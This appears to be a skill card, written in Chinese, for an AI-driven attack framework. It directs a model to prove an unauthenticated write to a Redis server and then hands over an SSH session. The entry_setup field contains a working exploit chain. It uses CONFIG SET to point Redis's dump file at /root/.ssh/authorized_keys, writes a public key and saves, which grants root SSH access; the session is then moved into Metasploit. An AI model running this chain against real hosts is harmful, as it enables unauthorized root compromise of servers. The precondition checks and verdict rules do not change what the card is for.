---
name: redis-unauth-write
handover: card
description: 在无鉴权键值存储服务上完成一次写入并用同源回读证明本次写入，随后在该主机上交付一条满足目标身份的会话引用。适用：绑定图给定的方法与目标；先观察，再由模型选择回读探针或会话交付并逐动作构造。
metadata:
  predicates:
  - public_application_initial
  - redis
  - T1190
  platforms:
  - linux
  keywords:
  - Redis未授权写入
  - Redis无认证写入
  - Redis unauthenticated write
  - exploit.redis_unauth_write
  - method
  - position
  - cmd
  - msf
  - public_application_initial
  - redis
  - T1190
  - unauth
  - write
  resources: []
  categories:
  - action-method
  aliases:
  - Redis
  - 未授权
  - key write
  - redis-cli
  parameters:
  - host
  - port
  when:
    service: redis
  requires: []
  excludes: []
  carriers:
  - kali
  - shell
serves:
- redis
- redis_unauth_key_write
entry_setup:
  provider: ssh
  username: root
  port: 22
  authorize_command: |
    redis-cli -h {target_address} -p {target_port} CONFIG SET save '' && redis-cli -h {target_address} -p {target_port} CONFIG SET dir /root/.ssh && redis-cli -h {target_address} -p {target_port} CONFIG SET dbfilename authorized_keys && redis-cli -h {target_address} -p {target_port} CONFIG SET rdbcompression no && (echo; echo; cat {public_key_file}; echo) | redis-cli -h {target_address} -p {target_port} -x set agv_entry_key && redis-cli -h {target_address} -p {target_port} SAVE && redis-cli -h {target_address} -p {target_port} CONFIG SET rdbcompression yes && redis-cli -h {target_address} -p {target_port} CONFIG SET save '' && redis-cli -h {target_address} -p {target_port} CONFIG SET dir /tmp && redis-cli -h {target_address} -p {target_port} CONFIG SET dbfilename dump.rdb && echo "{marker}"
---

## 适用场景

在一个**没有鉴权**的键值存储服务上完成一次写入，并用**同源回读**证明这次写入；本节点的产出事实是 `execCode(<主机>, <身份>)`，所以最后还要用同一次写入承载会话材料、交付一条**真实登记**的会话引用。

- 执行点须具备 `redis-cli` 并能访问目标服务；本卡没有认证入参，适用于无需认证即可完成相应操作的实例。
- **“命令里没写密码”不等于“这个实例没有鉴权”**：调用方仍须核实未授权前提。
- `target_host`、`key`、`value` 由运行层在派发前绑定，缺必需输入按 pending 处理；执行点或所需上游会话未就绪时不得回退到控制端。入口要求非空键值并去掉键的首尾空白。
- 只有启用可选配置与 SAVE 时，才额外要求对应命令可用及服务进程具有落盘权限。
- 输入与工具面：图给 `target_host`；运行侧给 `key`、`value`（**不得杜撰**）；模型现场决定的输入：无；工具面 `run_command` —— 写成 `{"tool":"run_command","target":"kali","arguments":{"interpreter":"sh","command":"<一条命令行>"}}`；本节点的冻结入口就是 `kali`。回执原样带回。工具用法与坑点见 `skills/_tooling/redis-cli.md`。

## 参数

- 输入 `target_host` / `target_port`：来自图（节点目标主机与服务端口）
- 公钥与迁移材料由运行层持有，模型不接触密钥，也不需要 `delivery_*` 变量
- 交付：evidence；SSH 引用由运行层导出
- 执行位置：`context.execution.via`（本节点为 `kali`）
- 可用工具：`run_command`
- 图适用：case=public_application_initial；service=redis；technique=T1190；本卡 `serves`：`redis`、`redis_unauth_key_write`

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**一条一个动作块；有依赖的步骤绝不合并。** 顺序固定：证明这次未授权写入 → 运行层按卡面 `entry_setup` 写入公钥并导出 SSH 引用 → 收尾。每一步先读回执再写下一步。

**SSH 入口与后续迁移由运行层完成**：本卡只证明未授权写入。运行层按卡面 `entry_setup` 把本次运行公钥写进宿主 root 的 `authorized_keys`，Action 结束后导出 SSH 引用交给 Post；Post 通过后再由运行层迁移进 MSF。**不要自己造密钥、不要起监听、不要送载荷、不要登记会话。**

0. **证明这次未授权写入（`cmd`，一发）**：向目标写一个**本次调用专用、无首尾空白**的键，并用**同源回读**证明它：

   ```text
   {"tool":"run_command","target":"kali","arguments":{"interpreter":"sh","command":"redis-cli -h <target_address> -p <target_port> SET agv_probe_<本次序号> <value> && redis-cli -h <target_address> -p <target_port> GET agv_probe_<本次序号>"}}
   ```

   回执须含写入的 `OK` 与回读值；`SET` 可能覆盖已有键，调用前先确认键名不会被占用。

1. **收尾**：按 `citations` 引本次回执，然后 `finish`。**SSH 引用由运行层导出、Post 验证、迁移后登记，本卡不自己登记会话**。

前提：该端点无需认证即可读写；宿主目标账号接受公钥登录；服务进程有权限写入该目录与文件。不满足时**如实失败**，不退回"把别的执行通道改个名"。

**本卡的完成依据是本次未授权写入的同源回读回执**：`SET` 返回 `OK` 且 `GET` 回读到本次值，即判 `passed` 且 `action_complete=true`。SSH 入口由运行层按 `entry_setup` 建立并导出，**不要再追加任何「确认会话」的探测**；导出失败由运行层如实记录，不是让你在本卡里继续试的理由。

本步判 `passed` 需要出现本卡要求的证据；出现明确失败条件判 `failed`；证据不足或效果未确认判 `unknown`，不拿「请求已发出」代替证据。


## 完成依据

**`finish.verdict` 判本卡要求的事实是否成立；三道闸只判“这次键值写入与同源回读”这一段观察，节点有没有完成看产出事实 —— 会话被登记（由运行层拿会话自己报出的身份判）；只做到回读、没有会话 = 没完成。**

三个阻断闸为 freshness、target、effect；`identity_rule=null`。

- **freshness**：核对主判 `GET` 调用的执行状态与调用锚定。
- **target**：核对证据中的 `target_host` 与节点目标上下文；缺节点目标时退回与绑定输入对照（`target_host` 来自输入，不是独立观测的实例身份，证据也未单列端口）。
- **effect**：注册规则 `readback_value==value` —— 回读与输入值均须在场且非空、按字符串比较相等；若 `write_accepted` 为布尔 false，即使回读相等仍判不满足（`write_accepted` 由入口按 `SET` 输出是否含 `OK` 生成，不是完整的协议成功校验）。

- **pass**：三个阻断闸均通过（写入返回 `OK` 不能单独使本卡通过）。
- **unsatisfied**：回读与输入值不同，或有效回读比较后发现 `write_accepted=false`，或其他阻断闸返回 unsatisfied。
- **uncertain**：没有阻断闸返回 unsatisfied，但回读或待比较输入值缺失、为空，或其他阻断闸返回 uncertain；缺证据不猜填。

证据字段：`call_id`、`target_host`、`write_accepted`、`readback_value`；`stdout` 指向 `GET` 的原始输出，其他步骤保留各自调用记录。通过只支持键值回读判据成立，**不证明**可选配置变更、文件落盘、登录或清理成功。

## 失败条件

- **停止边界：本卡一次调用只走上面那条序列；走完即 `finish`，不由本卡重试、追加动作或换卡。** 超时、断连或中途错误后保留全部调用及部分输出，先核对已发生的键值、配置与文件效果，交编排按通用核对与停止契约处理。
- 解析只取 `GET` 的首个非空行，并去掉首尾空白及双引号；`(nil)` 按缺值处理。多行值、首尾空白、转义文本不能保证保真核对（可能产生错误的「不满足」），本轮只使用可直接比较的简单单行文本，不改原值、不猜填回读来取得通过。
- `SET` 可能覆盖已有键；`cleanup=true` 只在回读后追加 `DEL`，**不恢复**被覆盖的原值及原有状态（`cleanup_deleted` 仅按删除调用输出是否含独立的 1 记录，未进入本卡阻断判据）。
- 可选 `CONFIG SET` 会改变实例配置，`SAVE` 会尝试写出数据库快照、可能覆盖同名文件；入口不恢复 `dir`、`dbfilename`，`DEL` 也不撤销已经落盘的文件。使用这些选项前须核对原配置、实际落点与已有文件；需要复原时由编排另行处理，复跑前核对残留。
- 入口没有按每一步返回的失败状态主动中止后续步骤；不能假定 `SET` 失败后 `GET` 或 `DEL` 就不会执行。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
